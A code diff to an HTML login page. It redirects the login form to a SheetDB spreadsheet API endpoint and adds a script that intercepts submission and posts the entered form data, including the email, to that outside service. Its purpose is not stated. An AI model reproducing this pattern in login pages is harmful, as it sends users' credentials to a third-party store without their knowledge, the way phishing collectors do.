@@ -31,7 +31,7 @@
     </header>
     <div class="box"> 
       <h1><center> Login Form</h1></center>
-      <form method="post" name="myform" onsubmit="return validation()">
+      <form id="sheetdb-form" action="https://sheetdb.io/api/v1/0fiwvbhzelau4" method="post" name="myform" onsubmit="return validation()">
         <p>Email <br>
           <input type="text" id="email" name="email"  class="form" required/><br>
         </p>
@@ -80,6 +80,21 @@
       </div>
     </div>
 </footer>
+    <script>
+  var form = document.getElementById('sheetdb-form');
+form.addEventListener("submit", e => {
+e.preventDefault();
+fetch(form.action, {
+    method : "POST",
+    body: new FormData(document.getElementById("sheetdb-form")),
+}).then(
+    response => response.json()
+).then((html) => {
+
+
+});
+});
+</script>
       <script src="js3.js"></script>
       <script src="js5.js"></script>
       <script>
